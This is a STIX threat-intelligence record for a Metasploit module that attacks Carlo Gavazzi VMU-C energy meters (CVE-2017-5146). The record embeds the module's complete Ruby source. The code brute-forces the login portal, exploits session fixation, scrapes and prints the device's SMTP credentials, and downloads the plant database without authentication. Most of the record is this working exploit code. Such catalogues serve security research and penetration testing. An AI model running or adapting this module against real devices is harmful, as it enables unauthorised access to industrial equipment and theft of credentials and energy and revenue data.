{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8230e009-53df-4ed2-b691-01037eb27baa",
    "created": "2024-08-14T16:29:19.979587Z",
    "modified": "2024-08-14T16:29:19.979591Z",
    "name": "Carlo Gavazzi Energy Meters - Login Brute Force, Extract Info and Dump Plant Database",
    "description": " This module scans for Carlo Gavazzi Energy Meters login portals, performs a login brute force attack, enumerates device firmware version, and attempt to extract the SMTP configuration. A valid, admin privileged user is required to extract the SMTP password. In some older firmware versions, the SMTP config can be retrieved without any authentication. The module also exploits an access control vulnerability which allows an unauthenticated user to remotely dump the database file EWplant.db. This db file contains information such as power/energy utilization data, tariffs, and revenue statistics. Vulnerable firmware versions include - VMU-C EM prior to firmware Version A11_U05 and VMU-C PV prior to firmware Version A17.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/gavazzi_em_login_loot.rb",
            "external_id": "gavazzi_em_login_loot.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-5146"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name' => 'Carlo Gavazzi Energy Meters - Login Brute Force, Extract Info and Dump Plant Database',\n      'Description' => %{\n        This module scans for Carlo Gavazzi Energy Meters login portals, performs a login brute force attack, enumerates device firmware version, and attempt to extract the SMTP configuration. A valid, admin privileged user is required to extract the SMTP password. In some older firmware versions, the SMTP config can be retrieved without any authentication. The module also exploits an access control vulnerability which allows an unauthenticated user to remotely dump the database file EWplant.db. This db file contains information such as power/energy utilization data, tariffs, and revenue statistics. Vulnerable firmware versions include - VMU-C EM prior to firmware Version A11_U05 and VMU-C PV prior to firmware Version A17.\n      },\n      'References' =>\n        [\n          ['URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-17-012-03'],\n          ['CVE', '2017-5146']\n        ],\n      'Author' =>\n         [\n           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'\n         ],\n      'License' => MSF_LICENSE,\n      'DefaultOptions' =>\n         {\n           'SSL' => false,\n           'VERBOSE' => true\n         }))\n\n    register_options(\n      [\n        Opt::RPORT(80),\t# Application may run on a different port too. Change port accordingly.\n        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'admin']),\n        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'admin'])\n      ], self.class\n    )\n  end\n\n  def run_host(ip)\n    unless is_app_carlogavazzi?\n      return\n    end\n\n    each_user_pass do |user, pass|\n      do_login(user, pass)\n    end\n    ewplantdb\n  end\n\n  #\n  # What's the point of running this module if the target actually isn't Carlo Gavazzi box\n  #\n\n  def is_app_carlogavazzi?\n    begin\n      res = send_request_cgi(\n        {\n          'uri'       => '/',\n          'method'    => 'GET'\n        }\n      )\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError\n      vprint_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")\n      return false\n    end\n\n    good_response = (\n      res &&\n      res.code == 200 &&\n      res.body.include?('Accedi') || res.body.include?('Gavazzi') || res.body.include?('styleVMUC.css') || res.body.include?('VMUC')\n    )\n\n    if good_response\n      vprint_good(\"#{rhost}:#{rport} - Running Carlo Gavazzi VMU-C Web Management portal...\")\n      return true\n    else\n      vprint_error(\"#{rhost}:#{rport} - Application is not Carlo Gavazzi. Module will not continue.\")\n      return false\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: Time.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  #\n  # Brute-force the login page\n  #\n\n  def do_login(user, pass)\n    vprint_status(\"#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}\")\n\n    # Set Cookie - Box is vuln to Session Fixation. Generating a random cookie for use.\n    randomvalue = Rex::Text.rand_text_alphanumeric(26)\n    cookie_value = 'PHPSESSID=' + \"#{randomvalue}\"\n\n    begin\n      res = send_request_cgi(\n        {\n          'uri'       => '/login.php',\n          'method'    => 'POST',\n          'headers'   => {\n            'Cookie' => cookie_value\n          },\n          'vars_post' =>\n            {\n              'username' => user,\n              'password' => pass,\n              'Entra' => 'Sign+In' # Also - 'Entra' => 'Entra' # Seen to vary in some models\n            }\n        }\n      )\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE\n      vprint_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")\n      return :abort\n    end\n\n    good_response = (\n      res &&\n      res.code == 200 &&\n      res.body.include?('Login in progress') || res.body.include?('Login in corso') &&\n      res.body.match(/id=\"error\" value=\"2\"/) || (res.code == 302 && res.headers['Location'] == 'disclaimer.php')\n    )\n\n    if good_response\n      print_good(\"SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}\")\n\n      # Extract firmware version\n      begin\n        res = send_request_cgi(\n          {\n            'uri' => '/setupfirmware.php',\n            'method' => 'GET',\n            'headers' => {\n              'Cookie' => cookie_value\n            }\n          }\n        )\n      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE\n        vprint_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")\n        return :abort\n      end\n\n      if res && res.code == 200\n        if res.body.include?('Firmware Version') || res.body.include?('Versione Firmware')\n          fw_ver = res.body.match(/Ver. (.*)[$<]/)[1]\n\n          if !fw_ver.nil?\n            print_good(\"#{rhost}:#{rport} - Firmware version #{fw_ver}...\")\n\n            report_cred(\n              ip: rhost,\n              port: rport,\n              service_name: \"Carlo Gavazzi Energy Meter [Firmware ver #{fw_ver}]\",\n              user: user,\n              password: pass\n            )\n          end\n        end\n      end\n\n      #\n      # Extract SMTP config\n      #\n\n      begin\n        res = send_request_cgi(\n          {\n            'uri'       => '/setupmail.php',\n            'method'    => 'GET',\n            'headers'   => {\n              'Cookie' => cookie_value\n            }\n          }\n        )\n\n      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE\n        vprint_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")\n        return :abort\n      end\n\n      if (res && res.code == 200 && res.body.include?('SMTP'))\n        dirty_smtp_server = res.body.match(/smtp\" value=(.*)[$=]/)[1]\n        dirty_smtp_user = res.body.match(/usersmtp\" value=(.*)[$=]/)[1]\n        dirty_smtp_pass = res.body.match(/passwordsmtp\" value=(.*)[$=]/)[1]\n\n        if (!dirty_smtp_server.nil?) && (!dirty_smtp_user.nil?) && (!dirty_smtp_pass.nil?)\n          smtp_server = dirty_smtp_server.match(/[$\"](.*)[$\"]/)\n          smtp_user = dirty_smtp_user.match(/[$\"](.*)[$\"]/)\n          smtp_pass = dirty_smtp_pass.match(/[$\"](.*)[$\"]/)\n\n          if (!smtp_server.nil?) && (!smtp_user.nil?) && (!smtp_pass.nil?)\n            print_good(\"#{rhost}:#{rport} - SMTP server: #{smtp_server}, SMTP username: #{smtp_user}, SMTP password: #{smtp_pass}\")\n          end\n        end\n      else\n        vprint_error(\"#{rhost}:#{rport} - SMTP config could not be retrieved. Check if the user has administrative privileges\")\n      end\n      return :next_user\n    else\n      print_error(\"FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}\")\n    end\n  end\n\n  #\n  # Dump EWplant.db database file - No authentication required\n  #\n\n  def ewplantdb\n    begin\n      res = send_request_cgi(\n        {\n          'uri' => '/cfg/EWplant.db',\n          'method' => 'GET'\n        }\n      )\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE\n      vprint_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")\n      return :abort\n    end\n\n    if res && res.code == 200\n      print_status(\"#{rhost}:#{rport} - dumping EWplant.db\")\n      print_good(\"#{rhost}:#{rport} - EWplant.db retrieved successfully!\")\n      loot_name = 'EWplant.db'\n      loot_type = 'SQLite_db/text'\n      loot_desc = 'Carlo Gavazzi EM - EWplant.db'\n      path = store_loot(loot_name, loot_type, datastore['RHOST'], res.body , loot_desc)\n      print_good(\"#{rhost}:#{rport} - File saved in: #{path}\")\n    else\n      vprint_error(\"#{rhost}:#{rport} - Failed to retrieve EWplant.db. Set a higher HTTPCLIENTTIMEOUT and try again. Else, check if target is running vulnerable version.?\")\n      return\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}